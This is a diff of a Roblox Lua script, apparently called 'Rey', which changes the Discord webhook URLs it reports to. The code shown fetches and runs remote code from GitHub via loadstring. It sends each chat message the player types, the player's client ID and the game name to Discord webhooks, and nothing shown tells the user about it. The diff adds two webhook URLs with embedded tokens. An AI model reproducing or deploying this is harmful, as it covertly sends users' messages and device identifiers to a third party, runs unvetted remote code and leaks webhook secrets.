@@ -1,8 +1,9 @@
 pcall(function()
-Data = loadstring(game:HttpGet("https://raw.githubusercontent.com/RezaKazzel/Script-Roblox/refs/heads/main/Data"))()
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
+local Webhuk1 = "https://discord.com/api/webhooks/1344385105774252052/Ty6imbzcU49d-vghGi6miUhbG1Vzlvho9WzRwRfAigQVDPS9pzFlHnfJF2D2Zz2grphF"
+local Webhuk2 = "https://discord.com/api/webhooks/1344385362591617205/4glHFEzq0nlTnev2V7bqq5yqHM2BDK0LNCrYaNgTVMe4jX6-BFlfyFmUvZF1EOnQOzqT"
 
 function HeadshotPict()
 	local HttpService = game:GetService("HttpService")
@@ -35,7 +36,7 @@ end
 Rey = loadstring(game:HttpGet('https://raw.githubusercontent.com/RezaKazzel/Script-Roblox/refs/heads/main/UI/Rey%20Library%20New'))()
 player.Chatted:Connect(function(message)
 	Rey:SendWebhook(
-		"https://discord.com/api/webhooks/1341465551649767544/6Z1RuqIzsrE0JZc2PC8ooNGaUZwYMwy918w9Lj1Jif_UCmRrE08nAfMJzm6btoexpb8X",
+		Webhuk2,
 		nil,
 		nil,
 		{
@@ -52,11 +53,11 @@ player.Chatted:Connect(function(message)
 end)
 
 Rey:SendWebhook(
-	"https://discord.com/api/webhooks/1341477324440469504/ihk7arCPTLD2GQ73cx9UDaGLdHiDdQQykfwqGvsHbnbU9TN_nbDDm7AQe9Rz8TJHkIog",
+	Webhuk1,
 	nil,
 	nil,
 	{
-		title = "Executing Rey for "..Data["Execute"].."\nGame: "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+		title = "Executing Rey\nGame: "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
 		color = tonumber("00FF00", 16),
 		footer = { text = HWID },
 		author = {
